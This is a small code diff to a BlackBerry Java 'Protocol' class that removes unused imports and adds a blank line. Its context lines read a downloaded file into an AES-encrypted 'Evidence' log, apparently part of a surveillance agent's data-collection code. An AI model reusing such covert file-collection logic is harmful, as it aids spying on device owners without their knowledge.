@@ -8,13 +8,10 @@ import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.Status;
 import blackberry.action.sync.protocol.CommandException;
-import blackberry.action.sync.protocol.Proto;
 import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.transport.Transport;
 import blackberry.config.Conf;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -254,6 +251,7 @@ public abstract class Protocol {
         byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
         Evidence log = new Evidence(false, Encryption.getKeys().getAesKey());
+
         log.createEvidence(additional, EvidenceType.DOWNLOAD);
         log.writeEvidence(content);
         log.close();
